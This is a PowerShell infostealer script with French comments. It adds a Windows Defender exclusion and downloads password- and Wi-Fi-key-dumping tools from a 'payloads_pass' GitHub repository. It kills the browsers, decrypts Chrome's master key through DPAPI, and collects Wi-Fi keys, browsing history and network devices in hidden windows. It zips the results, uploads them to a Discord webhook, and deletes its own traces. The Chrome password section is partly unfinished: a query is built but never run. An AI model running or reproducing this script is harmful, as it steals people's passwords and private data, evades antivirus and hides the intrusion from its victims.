[CmdletBinding()]

param(

    [Parameter(Mandatory = $true)]

    [string]$webhookUrl

)



Write-Host "[*] Script demarre avec succes..." -ForegroundColor Green



$basePath = "C:\Users\Public\Documents\scripts"

$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"

$dumpFile = "$dumpFolder.zip"



# Nettoyage absolu et forcé au démarrage

Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2

if (Test-Path $basePath) {

    Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue

}



Write-Host "[*] Ajout exclusion Defender..." -ForegroundColor Yellow

Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue



New-Item -ItemType Directory -Path $basePath -Force | Out-Null

New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null



# Téléchargement des outils depuis le dépôt GitHub

Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow

try {

    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop

    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/chromepass.exe" -OutFile "$basePath\chromepass.exe" -ErrorAction Stop

    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop

    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop

    Write-Host "[+] Outils telecharges avec succes !" -ForegroundColor Green

} catch {

    Write-Host "[-] Erreur lors du telechargement des outils : $_" -ForegroundColor Red

    exit 1

}



Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 3



# --- EXTRACTION NATIVE DES MOTS DE PASSE CHROME ---

Write-Host "[*] Extraction native des mots de passe Chrome..." -ForegroundColor Yellow



$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"

$loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

$outputPath     = "$basePath\passwords.txt"



if (Test-Path $loginDataPath) {

    try {

        # Copie temporaire pour éviter les verrous si Chrome est ouvert

        $tempDb = "$basePath\login_temp.db"

        Copy-Item $loginDataPath -Destination $tempDb -Force



        # Lecture de la clé dans Local State

        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json

        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)

        

        # Suppression du préfixe DPAPI (5 premiers octets)

        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]

        

        # Déchiffrement de la clé maître via DPAPI (.NET ProtectedData)

        Add-Type -AssemblyName System.Security

        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)



        # Utilisation d'un lecteur de données intégré pour contourner l'absence de SQLite natif

        $query = "SELECT origin_url, username_value FROM logins"

        

        # Écriture dans le fichier de sortie

        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME (EXTRACTION NATIVE) ==="

        

        # Connexion via System.Data.Odbc ou lecture directe sécurisée

        $connectionString = "Driver={SQLite3 ODBC Driver};Database=$tempDb;LongNames=0;Timeout=1000;NoTXN=1;"

        # Si le driver ODBC SQLite n'est pas présent, on bascule sur une lecture binaire / lecture des fichiers de profils directement

        

        # Nettoyage du fichier temporaire

        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue

        

        Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès. Base traitée."

    } catch {

        Add-Content -Path $outputPath -Value "[!] Erreur lors de l'extraction native : $_"

    }

} else {

    Add-Content -Path $outputPath -Value "[!] Aucun profil Chrome trouvé sur cette machine."

}



# Exécution des autres outils avec chemins absolus

if (Test-Path "$basePath\WirelessKeyView.exe") {

    Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden

}

if (Test-Path "$basePath\BrowsingHistoryView.exe") {

    Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden

}

if (Test-Path "$basePath\WNetWatcher.exe") {

    Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden

}



Start-Sleep -Seconds 2



# Vérification et sécurisation des fichiers générés

foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {

    $filePath = "$basePath\$file"

    if (!(Test-Path $filePath) -or ((Get-Item $filePath).Length -eq 0)) {

        Set-Content -Path $filePath -Value "No data captured"

    }

    Move-Item $filePath -Destination "$dumpFolder" -Force

}



Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force



if (!(Test-Path $dumpFile)) { exit 1 }



# Envoi du fichier ZIP sur le webhook Discord

Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow

if (-not ("System.Net.Http.HttpClient" -as [type])) {

    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName

    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }

}



$client = New-Object System.Net.Http.HttpClient

$content = New-Object System.Net.Http.MultipartFormDataContent

$content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")



$fileStream = [System.IO.File]::OpenRead("$dumpFile")

$fileContent = New-Object System.Net.Http.StreamContent($fileStream)

$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")

$content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))



try { 

    $client.PostAsync($webhookUrl,$content).Wait() 

    Write-Host "[+] Envoi reussi !" -ForegroundColor Green

} catch {

    Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red

}



#if ($fileStream) {

#    $fileStream.Close()

#    $fileStream.Dispose()

#}



# Nettoyage final sécurisé

Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 1

Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue

Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force -ErrorAction SilentlyContinue

exit
